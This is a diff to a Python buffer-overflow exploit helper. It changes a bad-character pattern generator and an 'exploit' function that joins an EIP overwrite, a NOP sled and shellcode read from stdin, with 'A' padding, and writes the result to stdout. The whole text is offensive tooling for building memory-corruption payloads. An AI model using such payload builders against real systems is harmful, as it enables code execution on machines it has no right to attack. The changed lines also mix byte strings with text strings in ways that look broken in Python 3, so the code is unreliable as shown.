@@ -66,18 +66,19 @@ def offset(chars):
         continue
 
 def badchars(size,chars):
-    buffer = b"\x41" * (int(size)-256)
+    buffer = b"\x41" * (int(size)-256-20)
     for x in range(0,256):
-        buffer += x.to_bytes(1, 'big')
+        if not chr(x) in convert_to_hex(args.b):
+            buffer += chr(x)
+    buffer += "D" * 20 #Easily see end of buffer in debugger.
     return buffer
 
 def exploit(size,nops,shellcode,EIP,offset):
     nopsled = b"\x90" * int(nops)
     eip_val = bytearray(EIP)
     buffer = eip_val + nopsled + shellcode
-    pre_padding_size = size - len(buffer)
     post_padding_size = size - offset - int(nops) - len(shellcode) - 4   #Finds the amound of post-padding required
-    buffer = "A" * pre_padding_size + buffer
+    buffer = "A" * offset + buffer
     buffer += "A" * post_padding_size
     return buffer
 
@@ -94,7 +95,7 @@ def main():
     if (args.mode == "B"):
         if args.v:
             print("Generating Bad Pattern of size: " + args.positional)
-        sys.stdout.buffer.write(badchars(args.positional, args.b))
+        sys.stdout.write(badchars(args.positional, args.b))
     if (args.mode == "E"):
         shellcode = sys.stdin.read()
         sys.stdout.write(exploit(int(args.positional),int(args.n),shellcode,convert_to_hex(args.e),args.o))
